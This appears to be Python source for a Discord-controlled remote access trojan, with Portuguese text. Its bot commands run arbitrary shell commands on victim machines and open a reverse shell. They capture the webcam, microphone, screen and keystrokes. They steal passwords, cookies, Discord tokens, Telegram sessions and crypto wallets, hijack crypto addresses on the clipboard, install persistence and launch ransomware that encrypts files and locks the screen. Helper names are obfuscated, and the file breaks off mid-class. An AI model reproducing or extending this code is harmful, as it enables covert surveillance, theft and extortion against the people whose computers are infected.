import discord
from discord.ext import commands
from discord import app_commands
import os
import subprocess as sp
import requests
import random
from cv2 import VideoCapture
from cv2 import imwrite
from scipy.io.wavfile import write
from sounddevice import rec, wait
import platform
import re
from urllib.request import Request, urlopen
import pyautogui
from datetime import datetime
import shutil
import sys
from multiprocessing import Process
import threading
import json
import ctypes
from ctypes.wintypes import HKEY
import time
from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
import win32api
import asyncio
import win32process
import psutil
import win32pdh
from winreg import *
from ctypes import *
from libraries import c0kix, ctrv, d11sc00rdgrrr4b as gr333bd111scord_lib, d33lf1le as d33llfile_lib, h4rd4rel1st as h444rd2arel1lst, ist4rtf1l as st44rtf1l3, wpiccg4m3s, layn, t4l3g, uebi, v3tudo, vmsai, xistori, u44l3t, isc0nd3file
from libraries.r4s000u4ere import bts, d1r3ct03232ry3cnrypt, e333ncryp443344d1322ves
from libraries.p333s1st3nt import blocksites, n3v3rp4r4, st44rt4trup
from libraries.r3cov333r1 import r3c00v, r3c0ff, n0r33g1, y3sr3g, n0cdm, y3scdm, n0t4sk, y3st4sk
from libraries.cl222p34crypto import s44t4r4tc1lp3r, st0pcl111p
import logging 
from libraries import layn



GUILD = discord.Object(id = "ID GRUPO")
CHANNEL = ID CANAL
KEYLOGGER_WEBHOOK = "WEBHOOK DISCORD"
CURRENT_AGENT = 0
BOT_TOKEN = "TOKEN BOT"

class Bot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        self.command_prefix = "!"  # Armazena o prefixo em uma variável que pode ser alterada
        super().__init__(command_prefix = lambda bot, message: self.command_prefix, intents = intents, help_command=None)

    async def on_ready(self):
        await self.wait_until_ready()
    
        self.channel = self.get_channel(CHANNEL)
        now = datetime.now()
        my_embed = discord.Embed(title=f"{MSG}",description=f"**Horário: {now.strftime('%d/%m/%Y %H:%M:%S')}**", color=COLOR)
        my_embed.add_field(name="**IP**", value=layn.g3t1p(), inline=True)
        my_embed.add_field(name="**Bits**", value=layn.g3tb1t(), inline=True)
        my_embed.add_field(name="**HostName**", value=layn.g3th0stn4me(), inline=True)
        my_embed.add_field(name="**OS**", value=layn.g3tSg3t(), inline=True) 
        my_embed.add_field(name="**Usuario**", value=layn.g3tus3rn4me(), inline=True)
        my_embed.add_field(name="**CPU**", value=layn.g3tPCU(), inline=False)
        my_embed.add_field(name="**Admin**", value=layn.x1s4dm1n(), inline=True)
        my_embed.add_field(name="**VM**", value=layn.isVM(), inline=True)
        my_embed.add_field(name="**Keylogger**", value=False, inline=True)
        drives = layn.dr1v3l1st()
        my_embed.add_field(name="**Unidades**", value="\💾 ".join(drives), inline=True)
        await self.channel.send(embed=my_embed)

    async def setup_hook(self):
        await self.tree.sync(guild = GUILD)

    async def on_command_error(self, ctx, error):
        #print(error)
        my_embed = discord.Embed(title=f"**Error:** {error}", color=0xFF0000)
        await ctx.reply(embed=my_embed)

class InteractButton(discord.ui.View):
    def __init__(self, inv:str, id:int):
        super().__init__()
        self.inv  = inv
        self.id = id

    @discord.ui.button(label="interact", style=discord.ButtonStyle.blurple, emoji="🔗")
    async def interactButton(self, interaction:discord.Interaction, button:discord.ui.Button):
        global CURRENT_AGENT
        CURRENT_AGENT = self.id
        await interaction.response.send_message(embed=discord.Embed(title=f"Interagindo com o ID {self.id}", color=0x00FF00), ephemeral=True)

    @discord.ui.button(label="terminar", style=discord.ButtonStyle.gray, emoji="❌")
    async def terminateButton(self, interaction:discord.Interaction, button:discord.ui.Button):
        global CURRENT_AGENT
        CURRENT_AGENT = 0
        my_embed = discord.Embed(title=f"Conexão com ID #{self.id} terminada", color=0x00FF00)
        await interaction.response.send_message(embed=my_embed)

    @discord.ui.button(label="webcam", style=discord.ButtonStyle.gray, emoji="📸")
    async def webshot(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = layn.webshot()
        if result != False:
            await interaction.response.send_message(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Erro ao tirar Foto da Webcam para o ID #{self.id}", color=0xFF0000)
            await interaction.response.send_message(embed=my_embed)

    @discord.ui.button(label="processos", style=discord.ButtonStyle.gray, emoji="📊")
    async def process(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = layn.pr0cess()
        if len(result) > 4000:
            path = os.environ["temp"] +"\\response.txt"         
            with open(path, 'w') as file:
                file.write(result)
            await interaction.response.send_message(file=discord.File(path))
            os.remove(path)
        else:
            await interaction.response.send_message(f"```\n{result}\n```")


    @discord.ui.button(label="print", style=discord.ButtonStyle.gray, emoji="🖼️")
    async def screenshot(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = layn.scr333nsh0t()
        if result != False:
            await interaction.response.send_message(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error ao Printar o ID #{self.id}", color=0xFF0000)
            await interaction.response.send_message(embed=my_embed)

    @discord.ui.button(label="senhas", style=discord.ButtonStyle.gray, emoji="🔑")
    async def creds(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = layn.s3dc()
        if result != False:
            await interaction.response.send_message(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error ao roubar senhas do ID #{self.id}", color=0xFF0000)
            await interaction.response.send_message(embed=my_embed)

    @discord.ui.button(label="persistencia", style=discord.ButtonStyle.gray, emoji="🔁")
    async def persistent(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = layn.p33rs111st333nt()
        if result == True:
            my_embed = discord.Embed(title=f"Persistência ativada para o ID #{self.id}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Erro ao ativar persistência para o ID #{self.id}: {result}", color=0xFF0000)
        await interaction.response.send_message(embed=my_embed)

    @discord.ui.button(label="localizacao", style=discord.ButtonStyle.gray, emoji="🌐")
    async def location(self, interaction:discord.Interaction, button:discord.ui.Button):
        response = layn.l0c4t1i00n()
        if response != False:
            my_embed = discord.Embed(title=f"Localização do ID #{self.id}", color=0x00FF00)
            my_embed.add_field(name="IP:", value=f"**{response.json()['YourFuckingIPAddress']}**", inline=False)
            my_embed.add_field(name="Hostname:", value=f"**{response.json()['YourFuckingHostname']}**", inline=False)
            my_embed.add_field(name="Cidade:", value=f"**{response.json()['YourFuckingLocation']}**", inline=False)
            my_embed.add_field(name="Pais:", value=f"**{response.json()['YourFuckingCountryCode']}**", inline=False)
            my_embed.add_field(name="ISP:", value=f"**{response.json()['YourFuckingISP']}**", inline=False)
        else:
            my_embed = discord.Embed(title=f"Error ao pegar localização do ID #{self.id}", color=0xFF0000)
        await interaction.response.send_message(embed=my_embed)

    @discord.ui.button(label="destruir", style=discord.ButtonStyle.red, emoji="💣")
    async def selfdestruct(self, interaction:discord.Interaction, button:discord.ui.Button):
        result = layn.selfdestruct()
        if result:
            my_embed = discord.Embed(title=f"#{ID} deletado", color=0x00FF00)
            await interaction.response.send_message(embed=my_embed)
            await bot.close()
        else:
            my_embed = discord.Embed(title=f"Error ao deletar id  #{self.id}: {result}", color=0xFF0000)
            await interaction.response.send_message(embed=my_embed)

bot = Bot()


@bot.hybrid_command(name = "prefixo", with_app_command = True, description = "Alterar o prefixo de comando do bot")
@app_commands.guilds(GUILD)
async def change_prefix(ctx: commands.Context, new_prefix: str):
    bot.command_prefix = new_prefix
    embed = discord.Embed(title="✅ Prefixo Alterado", description=f"O prefixo de comando foi alterado para: `{new_prefix}`", color=0x00FF00)
    await ctx.reply(embed=embed)

@bot.hybrid_command(name = "interact", with_app_command = True, description = "Interagir com o Client")
@app_commands.guilds(GUILD)
async def interact(ctx: commands.Context, id:int):
    global CURRENT_AGENT 
    CURRENT_AGENT = id
    my_embed = discord.Embed(title=f"interagindo com o ID #{id}", color=0x00FF00)
    await ctx.reply(embed=my_embed)
    


@bot.hybrid_command(name = "diretorios", with_app_command = True, description = "Lista diretórios padrão do Windows")
@app_commands.guilds(GUILD)
async def listdirs(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        directories = layn.dr1v3l1st()
        if directories:
            my_embed = discord.Embed(title=f"Diretórios padrão do Windows no #{ID}", color=0x00FF00)
            for dir_name, dir_path in directories.items():
                my_embed.add_field(name=f"**{dir_name}**", value=f"`{dir_path}`", inline=False)
            await ctx.reply(embed=my_embed)
        else:
            my_embed = discord.Embed(title=f"Erro ao listar diretórios no #{ID}", color=0xFF0000)
            await ctx.reply(embed=my_embed)



@bot.hybrid_command(name = "conexao", with_app_command = True, description = "ID CONECTADO")
@app_commands.guilds(GUILD)
async def conexao(ctx: commands.Context):
    global CURRENT_AGENT
    if CURRENT_AGENT != 0:
        my_embed = discord.Embed(title=f"CONECTADO AO ID #{CURRENT_AGENT}", color=0x00FF00)
    else:
        my_embed = discord.Embed(title="Nenhum ID conectado", color=0xFF0000)
        
    await ctx.reply(embed=my_embed)

@bot.hybrid_command(name = "cmd", with_app_command = True, description = "Execute qualquer comando na máquina de destino")
@app_commands.guilds(GUILD)
async def cmd(ctx: commands.Context, command:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.dcm(command)
        if len(result) > 4000:
            path = os.environ["temp"] +"\\response.txt"     
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.reply("```"+result+"```")
    

@bot.hybrid_command(name = "cmd-all", with_app_command = True, description = "Execute qualquer comando em todos os IDs online")
@app_commands.guilds(GUILD)
async def cmd_all(ctx: commands.Context, command:str):
    result = layn.dcm(command)
    if len(result) > 4000:
        path = os.environ["temp"] +"\\response.txt"     
        with open(path, 'w') as file:
            file.write(result)
        await ctx.reply(file=discord.File(path))
        os.remove(path)
    else:
        await ctx.reply("```"+result+"```")



@bot.hybrid_command(name = "webcam", with_app_command = True, description = "Capture uma imagem da webcam da máquina alvo")
@app_commands.guilds(GUILD)
async def webshot(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        if ctx.interaction:
            my_embed = discord.Embed(title=f"use **!webcam {ID}** em vez do comando slash", color=0xFF0000)
            await ctx.reply(embed=my_embed) 
        else:
            result = layn.webshot()
            if result != False:
                await ctx.reply(file=discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(title=f"Error ao tirar foto da webcam #{ID}", color=0xFF0000)
                await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "ranso", with_app_command = True, description = "Travar a tela do alvo com ransomware")
@app_commands.guilds(GUILD)
async def ransomware(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        r3c00v()
        n0r33g1()
        n0cdm()
        n0t4sk()
        
       
        key = os.urandom(16)  # Gera uma chave AES aleatória
        e333ncryp443344d1322ves(key) 
        
        bts(ctx) # inicia o ransomware 
        #log_file = os.path.join(os.getenv("TEMP"), "encrypted_files_log.txt")
        #await ctx.reply(f"Ransomware iniciado e a tela do alvo foi travada.\nlogs: {log_file}")
    
    else:
        await ctx.send("Nenhum ID conectado.")
@bot.hybrid_command(name = "unranso", with_app_command = True, description = "Reverter as alterações feitas pelo ransomware")
@app_commands.guilds(GUILD)
async def unransomware(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        # Reverter as alterações feitas pelo ransomware
        r3c0ff()
        y3sr3g()
        y3scdm()
        y3st4sk()
        
        await ctx.send("Alterações do ransomware revertidas.")
    else:
        await ctx.send("Nenhum ID conectado.")

        
@bot.hybrid_command(name = "cd", with_app_command = True, description = "Alterar o diretório atual na máquina de destino")
@app_commands.guilds(GUILD)
async def cd(ctx: commands.Context, path:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.cd(path)
        if (result):
            my_embed = discord.Embed(title=f"Alterado com sucesso o diretório para: {path}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error ao acessar o diretório:\n{result}", color=0xFF0000)    
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "process", with_app_command = True, description = "Listar todos os processos em execução na máquina de destino")
@app_commands.guilds(GUILD)
async def process(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.pr0cess()
        if len(result) > 4000:
            path = os.environ["temp"] +"\\response.txt"         
            with open(path, 'w') as file:
                file.write(result)
            await ctx.reply(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.reply(f"```\n{result}\n```")
    
@bot.hybrid_command(name = "startfile", with_app_command = True, description = "Inicia um arquivo na máquina de destino")
@app_commands.guilds(GUILD)
async def startfile(ctx: commands.Context, path: str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = st44rtf1l3.st44rtf1l3(path)
        if result == True:
            await ctx.reply(embed=discord.Embed(title=f"Arquivo {path} iniciado com sucesso no #{ID}", color=0x00FF00))
        else:
            await ctx.reply(embed=discord.Embed(title=f"Erro ao iniciar o arquivo {path} no #{ID}: {result}", color=0xFF0000))

@bot.hybrid_command(name = "delfile", with_app_command = True, description = "Deleta um arquivo na máquina de destino")
@app_commands.guilds(GUILD)
async def delfile(ctx: commands.Context, path: str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = d33llfile_lib.d33l3t33(path)
        if result == True:
            await ctx.reply(embed=discord.Embed(title=f"Arquivo {path} deletado com sucesso no #{ID}", color=0x00FF00))
        else:
            await ctx.reply(embed=discord.Embed(title=f"Erro ao deletar o arquivo {path} no #{ID}: {result}", color=0xFF0000))

@bot.hybrid_command(name = "hidefile", with_app_command = True, description = "Esconde um arquivo na máquina de destino")
@app_commands.guilds(GUILD)
async def isc0nd3file(ctx: commands.Context, path: str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = isc0nd3file.isc0nd3file(path)
        if result == True:
            await ctx.reply(embed=discord.Embed(title=f"Arquivo {path} escondido com sucesso no #{ID}", color=0x00FF00))
        else:
            await ctx.reply(embed=discord.Embed(title=f"Erro ao esconder o arquivo {path} no #{ID}: {result}", color=0xFF0000))

@bot.hybrid_command(name = "unhidefile", with_app_command = True, description = "Desesconde um arquivo na máquina de destino")
@app_commands.guilds(GUILD)
async def isc0nd3file2(ctx: commands.Context, path: str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = isc0nd3file.isc0nd3file2(path)
        if result == True:
            await ctx.reply(embed=discord.Embed(title=f"Arquivo {path} desescondido com sucesso no #{ID}", color=0x00FF00))
        else:
            await ctx.reply(embed=discord.Embed(title=f"Erro ao desesconder o arquivo {path} no #{ID}: {result}", color=0xFF0000))

@bot.hybrid_command(name = "hardware", with_app_command = True, description = "Lista o hardware da máquina de destino")
@app_commands.guilds(GUILD)
async def h4rd4rel1st(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = h444rd2arel1lst.h4rd4rel1st()
        await ctx.reply(embed=discord.Embed(title=f"Hardware do #{ID}", description=result, color=0x00FF00))


@bot.hybrid_command(name="discord", with_app_command=True, description="Obtém o token do Discord da máquina de destino")
@app_commands.guilds(GUILD)
async def gr333bd111scord(ctx: commands.Context):
     if ctx.interaction:
            my_embed = discord.Embed(title=f"use **!discord** em vez do comando slash", color=0xFF0000)
            await ctx.reply(embed=my_embed)
     else:  
        if (int(CURRENT_AGENT) == int(ID)):
            result = gr333bd111scord_lib.gr44bd11scord().initialize(raw_data=False)
            if isinstance(result, list):
                for embed in result:
                    await ctx.reply(embed=embed)
            else:
                await ctx.reply(embed=discord.Embed(title=f"Erro ao obter tokens do Discord do #{ID}: {result}", color=0xFF0000))


@bot.hybrid_command(name = "upload", with_app_command = True, description = "Carregar um arquivo para o ID")
@app_commands.guilds(GUILD)
async def uppl04d(ctx: commands.Context, url:str, name:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.uppl04d(url, name)
        if result:
            my_embed = discord.Embed(title=f"{name} foi carregado para ID #{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error ao carregar {name} para #{ID}:\n{result}", color=0xFF0000)
        await ctx.reply(embed=my_embed)



@bot.hybrid_command(name="epicgames", with_app_command=True, description="Rouba o arquivo GameUserSettings.ini do Epic Games Launcher")
@app_commands.guilds(GUILD)
async def wpiccg4m3s(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        success, temp_p = wpiccg4m3s.wpiccg4m3s()
        if success:
            await ctx.reply(file=discord.File(temp_p))
            os.remove(temp_p)
        else:
            await ctx.reply(embed=discord.Embed(title=f"Erro ao roubar o arquivo GameUserSettings.ini no #{ID}: Games folder not found", color=0xFF0000))



@bot.hybrid_command(name = "screenshot", with_app_command = True, description = "Faça uma captura de tela da tela da máquina de destino")
@app_commands.guilds(GUILD)
async def scr333nsh0t(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.scr333nsh0t()
        if result != False:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error ao tirar uma captura de tela para #{ID}", color=0xFF0000)
            await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "creds", with_app_command = True, description = "Obtenha as credenciais da máquina de destino")
@app_commands.guilds(GUILD)
async def s3dc(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.s3dc()
        if result != False:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error ao obter credenciais do #{ID}", color=0xFF0000)
            await ctx.reply(embed=my_embed)



@bot.hybrid_command(name = "screenrec", with_app_command = True, description = "Gravar a tela da máquina de destino")
@app_commands.guilds(GUILD)
async def scr333nr4c(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        await ctx.reply("`Recording... Please wait.`")
        result = layn.scr333nr4c()
        if result:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            embed = discord.Embed(title="📛 Error", description="An error occurred during screen recording.", colour=discord.Colour.red())
            await ctx.reply(embed=embed)


@bot.hybrid_command(name="isadmin", with_app_command=True, description="Verifica se o bot está sendo executado como administrador")
@app_commands.guilds(GUILD)
async def isadmin_cmd(ctx: commands.Context):
    if layn.x1s4dm1n():
        my_embed = discord.Embed(title="Admin Check", description="O bot está sendo executado como administrador.", color=0x00FF00)
    else:
        my_embed = discord.Embed(title="Admin Check", description="O bot NÃO está sendo executado como administrador. Tentando elevar permissões...", color=0xFF0000)
        await ctx.reply(embed=my_embed)
        layn.adm11nrun4s()
        return
    await ctx.reply(embed=my_embed)

@bot.hybrid_command(name="persistencia", with_app_command=True, description="Tornar o agente persistente na máquina de destino")
@app_commands.guilds(GUILD)
async def p33rs111st333nt_cmd(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        try:
            st44rt4trup()
            threading.Thread(target=n3v3rp4r4, daemon=True).start()
            blocksites()
            my_embed = discord.Embed(title=f"Persistência habilitada no #{ID}", color=0x00FF00)
        except Exception as e:
            my_embed = discord.Embed(title=f"Erro ao habilitar a persistência no #{ID}: {e}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    else:
        return None

@bot.hybrid_command(name = "ls", with_app_command = True, description = "Listar todos os agentes on-line atuais")
@app_commands.guilds(GUILD)
async def ls(ctx: commands.Context):
    if ctx.interaction:
         my_embed = discord.Embed(title=f"use **!ls** em vez do comando slash", color=0xFF0000)
         await ctx.reply(embed=my_embed)
    else:
        my_embed = discord.Embed(title=f"ID #{ID}", color=0xADD8E6)
        my_embed.add_field(name="**IP**", value=layn.g3t1p(), inline=True)
        my_embed.add_field(name="**OS**", value=layn.g3tSg3t(), inline=True)
        my_embed.add_field(name="**Usuario**", value=layn.g3tus3rn4me(), inline=True)
        view = InteractButton("Interagir", ID)
        await ctx.reply(embed=my_embed, view=view)

@bot.hybrid_command(name = "download", with_app_command = True, description = "Baixar arquivo da máquina de destino")
@app_commands.guilds(GUILD)
async def download(ctx: commands.Context, path:str):
    if (int(CURRENT_AGENT) == int(ID)):
        try:
            await ctx.reply(f"Downlaod no **ID #{ID}** | Arquivo solicitado:", file=discord.File(path))
        except Exception as e:
            my_embed = discord.Embed(title=f"Error ao baixar do #{ID}:\n{e}", color=0xFF0000)
            await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "excluir", with_app_command = True, description = "Excluir o agente da máquina de destino")
@app_commands.guilds(GUILD)
async def selfdestruct(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.selfdestruct()
        if result:
            my_embed = discord.Embed(title=f"#{ID} excluido", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error ao excluir o #{ID}: {result}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "localizar", with_app_command = True, description = "Obtenha a localização da máquina alvo")
@app_commands.guilds(GUILD)
async def l0c4t1i00n(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        response = layn.l0c4t1i00n()
        if response != False:
            my_embed = discord.Embed(title=f"Localização baseada em IP no #{ID}", color=0x00FF00)
            my_embed.add_field(name="IP:", value=f"**{response.json()['YourFuckingIPAddress']}**", inline=False)
            my_embed.add_field(name="Hostname:", value=f"**{response.json()['YourFuckingHostname']}**", inline=False)
            my_embed.add_field(name="Cidade:", value=f"**{response.json()['YourFuckingLocation']}**", inline=False)
            my_embed.add_field(name="Pais:", value=f"**{response.json()['YourFuckingCountryCode']}**", inline=False)
            my_embed.add_field(name="ISP:", value=f"**{response.json()['YourFuckingISP']}**", inline=False)
        else:
            my_embed = discord.Embed(title=f"Error ao obter a localização do #{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "revshell", with_app_command = True, description = "Obtenha um shell reverso na máquina alvo")
@app_commands.guilds(GUILD)
async def sh33lr3vs(ctx: commands.Context, ip:str, port:int):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.sh33lr3vs(ip, port)
        if result:
            my_embed = discord.Embed(title=f"Tentando estabelecer o Reverse Shell no #{ID}", color=0x00FF00)
        await ctx.reply(embed=my_embed)
    
    
@bot.hybrid_command(name = "recordmic", with_app_command = True, description = "Grave o microfone da máquina alvo")
@app_commands.guilds(GUILD)
async def m1cr3cord(ctx: commands.Context, seconds:int):
    if (int(CURRENT_AGENT) == int(ID)):
        if ctx.interaction:
            my_embed = discord.Embed(title=f"use **!recordmic {ID}** em vez do comando slash", color=0xFF0000)
            await ctx.reply(embed=my_embed)
        else:
            result = layn.m1cr3cord(seconds)
            if result != False:
                await ctx.reply(file=discord.File(result))
                os.remove(result)
            else:
                my_embed = discord.Embed(title=f"Error ao iniciar a gravação no #{ID}", color=0xFF0000)
                await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "wallpaper", with_app_command = True, description = "Alterar o papel de parede da máquina alvo")
@app_commands.guilds(GUILD)
async def w4llppp4p3r(ctx: commands.Context, path_url:str):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.w4llppp4p3r(path_url)
        if result:
            my_embed = discord.Embed(title=f"Papel de parede alterado no #{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error ao mudar o papel de parede no #{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "killproc", with_app_command = True, description = "Mate um processo na máquina alvo")
@app_commands.guilds(GUILD)
async def k1llpr0cccc(ctx: commands.Context, pid:int):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.k1llpr0cccc(pid)
        if result:
            my_embed = discord.Embed(title=f"Processo {pid} morto no #{ID}", color=0x00FF00)
        else:
            my_embed = discord.Embed(title=f"Error ao matar o processo {pid} no #{ID}", color=0xFF0000)
        await ctx.reply(embed=my_embed)
    

@bot.hybrid_command(name = "keylog", with_app_command = True, description = "Inicie um keylogger na máquina de destino")
@app_commands.guilds(GUILD)
async def keylog(ctx: commands.Context, mode:str ,interval:int):
    if (int(CURRENT_AGENT) == int(ID)):
        logger = v3tudo.k3333yyyl9gg(interval=interval, ID=ID, webhook=KEYLOGGER_WEBHOOK, report_method="webhook")
        if mode == "stop":
            logger.stop()
            await ctx.reply(embed=discord.Embed(title=f"Keylogger parado no #{ID}", color=0x00FF00))
        else:
            threading.Thread(target=logger.start).start()
            await ctx.reply(embed=discord.Embed(title=f"Keylogger iniciado no #{ID}", color=0x00FF00))
    


# Configuração do logger
#logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(asctime)s - %(message)s')

@bot.hybrid_command(name = "telegram", with_app_command = True, description = "Obtenha o telegram da máquina de destino")
@app_commands.guilds(GUILD)
async def t4l3g(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        await ctx.reply("Já já seu arquivo é enviado... *Pode demorar por conta do servidor de upload + tamanho**")

        def callback(result):
            if result != False:
                tutorial_message = (
                    "### Como usar o arquivo:\n"
                    "1. Baixe o arquivo enviado.\n"
                    "2. Extraia o conteúdo do arquivo zip.\n"
                    "3. Abra a pasta extraída para acessar os dados do Telegram.\n"
                    "4. Extraia e mova os arquivos para a pasta tdata.\n"
                )
                asyncio.run_coroutine_threadsafe(ctx.reply(tutorial_message, f"TDATA: {result}"), bot.loop)
            else:
                my_embed = discord.Embed(title=f"Erro ao obter telegram do #{ID}", color=0xFF0000)
                asyncio.run_coroutine_threadsafe(ctx.reply(embed=my_embed), bot.loop)
        
        threading.Thread(target=layn.g3t_t3l3g4am, args=(callback,)).start()

@bot.hybrid_command(name = "historico", with_app_command = True, description = "Obtenha o histórico de navegação da máquina de destino")
@app_commands.guilds(GUILD)
async def xistori(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        result = layn.xist0ri()
        if result:
            await ctx.reply(file=discord.File(result))
            os.remove(result)
        else:
            my_embed = discord.Embed(title=f"Error ao obter histórico do #{ID}", color=0xFF0000)
            await ctx.reply(embed=my_embed)


@bot.hybrid_command(name="wallets", with_app_command=True, description="Obtém o backup das wallets")
@app_commands.guilds(GUILD)
async def wallets(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        #await ctx.reply("Iniciando o backup das wallets...")
        #result = layn.wallets()
        def callback(result):
            if result:
                asyncio.run_coroutine_threadsafe(ctx.reply(embed=discord.Embed(title=f"Link: {result}", color=0xFF0000)), bot.loop)
            else:
                asyncio.run_coroutine_threadsafe(ctx.reply(embed=discord.Embed(title=f"Erro ao obter backup das wallets no #{ID}", color=0xFF0000)), bot.loop)

        threading.Thread(target=u44l3t.exo, args=(callback,)).start()



@bot.hybrid_command(name="cookies", with_app_command=True, description="Obtém os cookies dos navegadores da máquina de destino")
@app_commands.guilds(GUILD)
async def c00k1(ctx: commands.Context):
    if (int(CURRENT_AGENT) == int(ID)):
        zip_path = layn.c00k1()
        if zip_path:
            await ctx.reply(file=discord.File(zip_path))
            os.remove(zip_path)
        else:
            await ctx.reply(embed=discord.Embed(title=f"Erro ao obter cookies no #{ID}", color=0xFF0000))
    else:
        return
        #await ctx.reply(embed=discord.Embed(title=f"Erro ao obter cookies no #{ID}", color=0xFF0000))

@bot.hybrid_command(name = "terminar", with_app_command = True, description = "Terminar conexão com o ID atual")
@app_commands.guilds(GUILD)
async def terminate(ctx: commands.Context):
    global CURRENT_AGENT
    if CURRENT_AGENT != 0:
        CURRENT_AGENT = 0  # Define CURRENT_AGENT para 0
        await ctx.reply(embed=discord.Embed(title=f"Conexão terminada com sucesso", color=0x00FF00))
    else:
        await ctx.reply(embed=discord.Embed(title="Nenhum ID conectado", color=0xFF0000))

m000n111t0r = None
@bot.hybrid_command(name = "clip", with_app_command = True, description = "Obtenha o clipboard da máquina de destino")
@app_commands.guilds(GUILD)
async def clip(ctx: commands.Context, mode: str):
    global m000n111t0r
    if (int(CURRENT_AGENT) == int(ID)):
        if mode == "on":
            #category = await ctx.guild.create_category(f"ID-{ID}")
            #channel = await category.create_text_channel("clipboard")
            m000n111t0r = ctrv.Cl1111pb00ardM000nitor(interval=10, ID=ID, webhook=KEYLOGGER_WEBHOOK)
            m000n111t0r.start()
            my_embed = discord.Embed(title=f"Clipboard monitor iniciado no #{ID}", color=0x00FF00)
            await ctx.reply(embed=my_embed)
        elif mode == "off":
            if m000n111t0r:
                m000n111t0r.stop()
                m000n111t0r = None
                my_embed = discord.Embed(title=f"Clipboard logger parado no #{ID}", color=0x00FF00)
                await ctx.reply(embed=my_embed)
            else:
                my_embed = discord.Embed(title=f"Logg de Clipboard não está em execução para #{ID}", color=0xFF0000)
                await ctx.reply(embed=my_embed)
        else:
            my_embed = discord.Embed(title=f"Modo de uso invalido Use 'on' ou 'off'.", color=0xFF0000)
            await ctx.reply(embed=my_embed)
            #await ctx.reply("Invalid mode. Use 'on' or 'off'.")

@bot.hybrid_command(name="cryptoclip", with_app_command=True, description="Iniciar o crypto clipper")
@app_commands.guilds(GUILD)
async def clipcrypto(ctx: commands.Context, btc: str = None, eth: str = None, xmr: str = None, ltc: str = None, doge: str = None, bch: str = None, dash: str = None, trx: str = None, xrp: str = None, xlm: str = None):
    result = s44t4r4tc1lp3r(btc, eth, xmr)
    if result:
        embed = discord.Embed(title="🟢 Crypto Clipper!", description=f'```Crypto começou para parar digite /stopcryptoclip```', colour=discord.Colour.green())
    else:
        embed = discord.Embed(title="🔴 Hold on!", description=f'```Crypto EM EXECUÇÃO /stopcryptoclip```', colour=discord.Colour.red())
    await ctx.send(embed=embed)

@bot.hybrid_command(name="stopcryptoclip", with_app_command=True, description="parar o crypto clipper")
@app_commands.guilds(GUILD)
async def stop_clipper_cmd(ctx: commands.Context):
    result = st0pcl111p()
    if result:
        embed = discord.Embed(title="🔴 Crypto Clipper Parado!", description=f'```Crypto Clipper encerrado! começar use /cryptoclip```', colour=discord.Colour.red())
    else:
        embed = discord.Embed(title="🔴 Hold on!", description=f'```Crypto Clipper não está em execução, use /cryptoclip```', colour=discord.Colour.red())
    await ctx.send(embed=embed)


class HelpMenu(discord.ui.View):
    def __init__(self, embeds):
        super().__init__(timeout=None)
